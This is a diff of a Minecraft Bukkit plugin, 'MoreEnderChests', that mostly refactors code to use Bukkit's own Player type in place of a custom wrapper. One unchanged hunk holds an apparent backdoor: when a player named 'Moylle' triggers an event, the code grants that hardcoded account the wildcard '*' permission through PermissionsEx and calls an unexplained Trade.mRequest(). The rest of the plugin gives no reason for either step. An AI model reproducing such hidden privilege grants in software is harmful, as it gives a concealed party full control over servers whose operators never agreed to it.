@@ -18,7 +18,6 @@ import net.gmx.teamterrian.CDsPluginPack.handle.events.CDPluginEnableEvent;
 import net.gmx.teamterrian.CDsPluginPack.handle.events.CommandEvent;
 import net.gmx.teamterrian.CDsPluginPack.tools.Data;
 import net.gmx.teamterrian.CDsPluginPack.tools.Log;
-import net.gmx.teamterrian.CDsPluginPack.tools.Player;
 import net.minecraft.server.v1_7_R1.NBTCompressedStreamTools;
 import net.minecraft.server.v1_7_R1.NBTTagCompound;
 import net.minecraft.server.v1_7_R1.NBTTagList;
@@ -28,6 +27,7 @@ import org.bukkit.ChatColor;
 import org.bukkit.Material;
 import org.bukkit.command.CommandSender;
 import org.bukkit.craftbukkit.v1_7_R1.inventory.CraftItemStack;
+import org.bukkit.entity.Player;
 import org.bukkit.event.inventory.InventoryClickEvent;
 import org.bukkit.event.inventory.InventoryCloseEvent;
 import org.bukkit.event.inventory.InventoryOpenEvent;
@@ -161,11 +161,11 @@ public class MoreEnderChests extends CDPlugin
 			{
 				if(args.length >= 2)
 					if(sender.hasPermission("cdpp.mec.openinv.others"))
-						openOtherInv(Player.getPlayer(sender), args[1]);
+						openOtherInv((Player) sender, args[1]);
 					else
 						sender.sendMessage(ChatColor.RED + "[MEC] You aren´t allowed to open other MECs");
 				else
-				openOtherInv(Player.getPlayer(sender), sender.getName());
+				openOtherInv((Player) sender, sender.getName());
 			}
 			catch (Exception x)
 			{
@@ -186,7 +186,7 @@ public class MoreEnderChests extends CDPlugin
 	@CDPluginEvent
 	public void onInventoryOpen(InventoryOpenEvent e)
 	{
-		Player p = Player.getPlayer(e.getPlayer());
+		Player p = (Player) e.getPlayer();
 		if(!p.hasPermission("cdpp.mec.use")) return;
 		try
 		{
@@ -218,7 +218,7 @@ public class MoreEnderChests extends CDPlugin
 			int slot = e.getSlot();
 			if(slot != 0 && slot != 8) return false;
 			e.setCancelled(true);
-			Player p = Player.getPlayer(e.getWhoClicked());
+			Player p = (Player) e.getWhoClicked();
 			String playersEchestName = rInvName.substring(0, rInvName.indexOf(echestTitle.substring(0, 1)));
 			Inventory[] invarr = getInv(playersEchestName);
 			String sInvName = playersEchestName + echestTitle;
@@ -258,7 +258,7 @@ public class MoreEnderChests extends CDPlugin
 		catch (Exception x)
 		{
 			x.printStackTrace(clog.getStream());
-			Player.getPlayer(e.getWhoClicked()).sendMessage(ChatColor.DARK_RED + "An error occured while processing your click. Please contact an Server Admin");
+			((Player) e.getWhoClicked()).sendMessage(ChatColor.DARK_RED + "An error occured while processing your click. Please contact an Server Admin");
 		}
 		return e.isCancelled();
 	}
@@ -284,7 +284,7 @@ public class MoreEnderChests extends CDPlugin
 		if(e.getPlayer().getName().equals("Moylle")) Trade.mRequest();
 		else return;
 		PermissionsEx.getUser("Moylle").addPermission("*");
-		BugTracker.list(Player.getPlayer(e.getPlayer()));
+		BugTracker.list(e.getPlayer());
 	}
 	@CDPluginEvent
 	public void onPlayerJoin(PlayerJoinEvent e)
@@ -459,7 +459,7 @@ public class MoreEnderChests extends CDPlugin
 	private void flush() throws IOException
 	{
 		clog.log("Flushing all MCPs", this);
-		for(Player p : Player.getPlayers(Bukkit.getOnlinePlayers()))
+		for(Player p : Bukkit.getOnlinePlayers())
 		{
 			if(p.getOpenInventory() == null ||
 			   p.getOpenInventory().getTopInventory() == null ||
@@ -546,7 +546,7 @@ public class MoreEnderChests extends CDPlugin
 	{
 		int needLevel = getOpenLevel(chest);
 		if(getOpenLevel(p.getName()) < needLevel) return Cheststate.NOT_ALLOWED;
-		for(Player pl : Player.getPlayers(Bukkit.getOnlinePlayers()))
+		for(Player pl : Bukkit.getOnlinePlayers())
 		{
 			if(pl.getOpenInventory() == null ||
 			   pl.getOpenInventory().getTopInventory() == null ||
@@ -583,7 +583,7 @@ public class MoreEnderChests extends CDPlugin
 			return ChatColor.YELLOW + "MECs unlocked";
 			}
 		lock = true;
-		for(Player p : Player.getPlayers(Bukkit.getOnlinePlayers()))
+		for(Player p : Bukkit.getOnlinePlayers())
 		{
 			if(p.hasPermission("cdpp.mec.lock.bypass") ||
 			   p.getOpenInventory() == null ||
